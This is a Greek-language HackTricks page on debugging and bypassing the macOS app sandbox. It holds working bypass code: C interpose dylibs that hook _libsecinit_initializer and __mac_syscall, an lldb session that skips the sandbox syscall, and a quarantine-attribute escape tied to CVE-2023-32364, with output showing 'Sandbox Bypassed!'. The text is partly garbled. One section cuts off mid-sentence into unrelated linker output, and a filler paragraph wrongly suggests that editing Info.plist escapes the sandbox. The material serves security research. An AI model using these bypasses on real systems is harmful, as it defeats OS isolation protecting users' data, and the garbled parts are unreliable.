# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Διαδικασία φόρτωσης του Sandbox

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Εικόνα από <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Στην προηγούμενη εικόνα είναι δυνατόν να παρατηρήσετε **πώς θα φορτωθεί το sandbox** όταν εκτελείται μια εφαρμογή με το entitlement **`com.apple.security.app-sandbox`**.

Ο μεταγλωττιστής θα συνδέσει το `/usr/lib/libSystem.B.dylib` με το δυαδικό αρχείο.

Στη συνέχεια, το **`libSystem.B`** θα καλέσει και άλλες συναρτήσεις μέχρι η **`xpc_pipe_routine`** να στείλει τα entitlements της εφαρμογής στο **`securityd`**. Το securityd ελέγχει εάν η διεργασία πρέπει να τεθεί σε καραντίνα μέσα στο Sandbox και αν ναι, θα τεθεί σε καραντίνα.\
Τελικά, το sandbox θα ενεργοποιηθεί με μια κλήση στη **`__sandbox_ms`** η οποία θα καλέσει τη **`__mac_syscall`**.

## Δυνητικά Bypasses

### Παράκαμψη του χαρακτηριστικού καραντίνας

**Τα αρχεία που δημιουργούνται από διεργασίες στο sandbox** προστίθενται το **χαρακτηριστικό καραντίνας** για να αποτραπεί η διαφυγή από το sandbox. Ωστόσο, εάν καταφέρετε να **δημιουργήσετε έναν φάκελο `.app` χωρίς το χαρακτηριστικό καραντίνας** μέσα σε μια εφαρμογή στο sandbox, μπορείτε να κατευθύνετε το δυαδικό αρχείο του πακέτου της εφαρμογής να δείχνει στο **`/bin/bash`** και να προσθέσετε μερικές μεταβλητές περιβάλλοντος στο **plist** για να καταχραστείτε την εντολή **`open`** και να εκτελέσετε τη νέα εφαρμογή χωρίς sandbox.

Αυτό που έγινε στο [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Επομένως, αυτήν τη στιγμή, εάν είστε απλώς ικανός να δημιουργήσετε έναν φάκελο με όνομα που τελειώνει σε **`.app`** χωρίς το χαρακτηριστικό καραντίνας, μπορείτε να διαφύγετε από το sandbox επειδή το macOS ελέγχει μόνο το χαρακτηριστικό καραντίνας στον φάκελο **`.app`** και στο **κύριο εκτελέσιμο** (και θα κατευθύνουμε το κύριο εκτελέσιμο στο **`/bin/bash`**).

Σημειώστε ότι εάν ένα πακέτο .app έχει ήδη εξουσιοδοτηθεί να εκτελείται (έχει ένα quarantine xttr με τη σημαία εξουσιοδότησης για εκτέλεση), μπορείτε επίσης να το καταχραστείτε... εκτός αν δεν μπορείτε πλέον να γράψετε μέσα στο **`.app`** πακέτα εκτός αν έχετε κάποιες προνομιακές άδειες TCC (τις οποίες δεν θα έχετε μέσα σε ένα υψηλό sandbox).
{% endhint %}

### Κατάχρηση της λειτουργίας Open

Στα [**τελευταία παραδείγματα παράκαμψης του sandbox του Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) μπορεί

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Εξουσιοδοτήσεις

Σημειώστε ότι ακόμα κι αν ορισμένες **ενέργειες** επιτρέπονται από το **αμμοβολίστρα** αν μια εφαρμογή έχει μια συγκεκριμένη **εξουσιοδότηση**, όπως στο παράδειγμα:

```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```

### Διάβαση Παράκαμψης

Για περισσότερες πληροφορίες σχετικά με τη **Διάβαση Παράκαμψης**, ανατρέξτε στο:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Διάβαση Παράκαμψης του `_libsecinit_initializer` για την αποτροπή του sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Ενδιάμεση `__mac_syscall` για την αποτροπή του Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Αποσφαλμάτωση και παράκαμψη του Sandbox με το lldb

Ας συντάξουμε μια εφαρμογή που θα πρέπει να είναι σε sandbox:

{% tabs %}
{% tab title="undefined" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

Το αρχείο Info.plist είναι ένα αρχείο ρυθμίσεων που χρησιμοποιείται για να περιγράψει τις διάφορες ρυθμίσεις και δυνατότητες μιας εφαρμογής στο macOS. Περιέχει πληροφορίες όπως το όνομα της εφαρμογής, τον αριθμό έκδοσης, τον αριθμό της έκδοσης του λειτουργικού συστήματος που υποστηρίζεται και άλλες σχετικές ρυθμίσεις. Το Info.plist είναι σημαντικό για την ασφάλεια της εφαρμογής, καθώς περιέχει πληροφορίες για τις απαιτούμενες δικαιώματα και περιορισμούς πρόσβασης που επιβάλλονται από το sandbox του macOS.

Το Info.plist πρέπει να περιέχει τις σωστές ρυθμίσεις για να επιτραπεί η εκτέλεση της εφαρμογής σε ένα sandbox περιβάλλον. Αν οι ρυθμίσεις δεν είναι σωστές, η εφαρμογή μπορεί να αποτύχει να εκτελεστεί ή να έχει περιορισμένη πρόσβαση σε συγκεκριμένους πόρους του συστήματος.

Για να παρακάμψετε το sandbox του macOS, μπορείτε να τροποποιήσετε το Info.plist της εφαρμογής. Αυτό μπορεί να γίνει με διάφορους τρόπους, όπως την προσθήκη επιπλέον δικαιωμάτων πρόσβασης ή την απενεργοποίηση των περιορισμών που επιβάλλονται από το sandbox. Ωστόσο, πρέπει να ληφθεί υπόψη ότι η παράκαμψη του sandbox μπορεί να αποτελέσει ασφαλειακό κίνδυνο και να επιτρέψει την πρόσβαση σε ευαίσθητες πληροφορίες ή λειτουργίες του συστήματος.

```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Στη συνέχεια, μεταγλωττίστε την εφαρμογή:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, το οποίο ο **Sandbox δεν επιτρέπει**.\
Δημιουργήστε ένα αρχείο εκεί, καθώς μόλις παρακάμψετε το Sandbox, θα μπορεί να το διαβάσει:

```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Ας εκτελέσουμε αποσφαλμάτωση στην εφαρμογή για να δούμε πότε φορτώνεται ο Αμμοδοχείο (Sandbox):

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

{% hint style="warning" %}
**Ακόμα και αν ο προστατευτικός τοίχος του Sandbox έχει παρακαμφθεί, το TCC** θα ζητήσει από τον χρήστη να επιτρέψει στη διεργασία να διαβάσει αρχεία από την επιφάνεια εργασίας.
{% endhint %}

## Αναφορές

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
